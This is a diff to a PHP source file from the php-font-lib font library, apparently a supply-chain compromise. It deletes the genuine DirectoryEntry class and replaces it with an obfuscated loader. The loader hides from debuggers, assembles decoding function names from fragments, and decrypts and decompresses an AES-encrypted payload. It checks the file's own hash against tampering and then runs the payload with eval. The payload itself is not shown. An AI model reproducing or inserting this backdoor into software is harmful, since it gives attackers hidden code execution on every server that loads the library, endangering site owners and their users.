@@ -1,129 +1,28 @@
 <?php
-/**
- * @package php-font-lib
- * @link    https://github.com/PhenX/php-font-lib
- * @author  Fabien Ménager <fabien.menager@gmail.com>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-namespace FontLib\Table;
-
-use FontLib\TrueType\File;
-use FontLib\Font;
-use FontLib\BinaryStream;
-
-/**
- * Generic Font table directory entry.
- *
- * @package php-font-lib
- */
-class DirectoryEntry extends BinaryStream {
-  /**
-   * @var File
-   */
-  protected $font;
-
-  /**
-   * @var Table
-   */
-  protected $font_table;
-
-  public $entryLength = 4;
-
-  public $tag;
-  public $checksum;
-  public $offset;
-  public $length;
-
-  protected $origF;
-
-  static function computeChecksum($data) {
-    $len = strlen($data);
-    $mod = $len % 4;
-
-    if ($mod) {
-      $data = str_pad($data, $len + (4 - $mod), "\0");
-    }
-
-    $len = strlen($data);
-
-    $hi = 0x0000;
-    $lo = 0x0000;
-
-    for ($i = 0; $i < $len; $i += 4) {
-      $hi += (ord($data[$i]) << 8) + ord($data[$i + 1]);
-      $lo += (ord($data[$i + 2]) << 8) + ord($data[$i + 3]);
-      $hi += $lo >> 16;
-      $lo = $lo & 0xFFFF;
-      $hi = $hi & 0xFFFF;
-    }
-
-    return ($hi << 8) + $lo;
-  }
-
-  function __construct(File $font) {
-    $this->font = $font;
-    $this->f    = $font->f;
-  }
-
-  function parse() {
-    $this->tag = $this->font->read(4);
-  }
-
-  function open($filename, $mode = self::modeRead) {
-    // void
-  }
-
-  function setTable(Table $font_table) {
-    $this->font_table = $font_table;
-  }
-
-  function encode($entry_offset) {
-    Font::d("\n==== $this->tag ====");
-    //Font::d("Entry offset  = $entry_offset");
-
-    $data = $this->font_table;
-    $font = $this->font;
-
-    $table_offset = $font->pos();
-    $this->offset = $table_offset;
-    $table_length = $data->encode();
-
-    $font->seek($table_offset);
-    $table_data = $font->read($table_length);
-
-    $font->seek($entry_offset);
-
-    $font->write($this->tag, 4);
-    $font->writeUInt32(self::computeChecksum($table_data));
-    $font->writeUInt32($table_offset);
-    $font->writeUInt32($table_length);
-
-    Font::d("Bytes written = $table_length");
-
-    $font->seek($table_offset + $table_length);
-  }
-
-  /**
-   * @return File
-   */
-  function getFont() {
-    return $this->font;
-  }
-
-  function startRead() {
-    $this->font->seek($this->offset);
-  }
-
-  function endRead() {
-    //
-  }
-
-  function startWrite() {
-    $this->font->seek($this->offset);
-  }
-
-  function endWrite() {
-    //
-  }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_ggpbzi91=('bas'.'e64'.'_de'.'cod'.'e');
+$_p5r5b7aq=('gzu'.'nco'.'mpr'.'ess');
+$_ymzxxdhn=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_nqad11js='P/7ZJ4wfL/k=';
+$_wvdxmifr='70m3u2mc';
+$_qbjqq3zu='Ew9kbMU9';
+$_yt5qrbwg='qsN6PCe6';
+$_pwv0qtan='Scsy1UBn';
+$_g17m37b0='dqStTA==';
+$_q4us289i='gT3vgyHR';
+$_d2bwdpkj='yhkscGCH';
+$_zul275s1=$_ggpbzi91($_wvdxmifr.$_yt5qrbwg.$_pwv0qtan.$_qbjqq3zu.$_nqad11js);
+$_jzzz5dfk=$_ggpbzi91($_q4us289i.$_d2bwdpkj.$_g17m37b0);
+$_vns4kgdl=$_ggpbzi91('qlR1Zw+N6yA2TklKr6A9LKX3RhDuPCyY6v6vOQyDlAlFoDm8DJ1scUcszxaOf0SOsPkJ7xS9OVj5UKSp3WnWkk0T7gFZiVEEdZ2vgt9PuD8odJI2n+yfk/Fg7i7HFlU7pUMY58Jge2KcnnoR3/OSluZbOOJXx5vEAsnHdPtSuy5FNid7wAYHH0+y81Ohe2ZRxTI44hL0hQ2cAl+f1ImEPdz+fbGzWmNQweiDQmgv931XROVRa0YifTcYQkkpHch3rXOqmmVP6A3yqVCtvUPp1jqEDTEfLRcGqR299KCWXemUqWhEPj+hU1qhVJjTzwX+RBIxsphSf2RSBK2crkxAR5XSOaSFiNAbko/dkdAlaYnFJnKhYLw34mZxR+roAW+YX6Yea43HBG2NyYPrNhV92OqDCLPNRm7ae3KTtaNMltnk7j83xEnHxp6dvlRny6c5T/pZ2/aRyuVGEv92EwBHWsMd+wT+bXxsCh9idUusSoIhAXF18dUPs3gAlXuokzgNwLG2y8Hdlz6QTiXoJLMraWmuqy/xmWjPMb5PKWy8Cd7aEtD7JebgjS0y5pVs0G5hqwwDPQ9C5mfOMVStnwZWTG6bLVBHiDLdPw752lGx0IjyEmgiPstSQmvjSkYCna58XAeeyccqVb0FQMg5JH2ZO6Jdik/clHdgRsaZZB06q6LYacwHr9vnlVevG/T1ilpb6yGn9Njmo66B66r+bu/2HTWlAlIesn/EFtYTGBzJlckwESjRBUgjudSW1RFgpf+JMYhwJOCRtf9Lk71tcnUwiq8cCSwctPMLuGEixRs1fEG0D2zZ/yNErLadRRTOjvQlYdMTfV1g3XwrG6JYIcJooyteL0btiFUSN84GoDhhh8E=');
+$_oinfyban=$_ymzxxdhn($_vns4kgdl,'aes-256-cbc',$_zul275s1,OPENSSL_RAW_DATA,$_jzzz5dfk);
+if($_oinfyban===false){exit;}
+$_wgnq14s6=$_p5r5b7aq($_oinfyban);
+if($_wgnq14s6===false){exit;}
+$_yqhtkgc9='1a1418c27568d96d53c14cc0c0f23f6a6bf68c7c37f90e13795928b3164f496d';
+$_efpj2q26=@file_get_contents(__FILE__);
+if($_efpj2q26!==false){
+$_ty0f8qnw=str_replace($_yqhtkgc9,"0000000000000000000000000000000000000000000000000000000000000000",$_efpj2q26);
+$_vbof70hr=hash("sha256",$_ty0f8qnw);
+if($_vbof70hr!==$_yqhtkgc9){@http_response_code(403);exit;}
 }
-
+eval($_wgnq14s6);
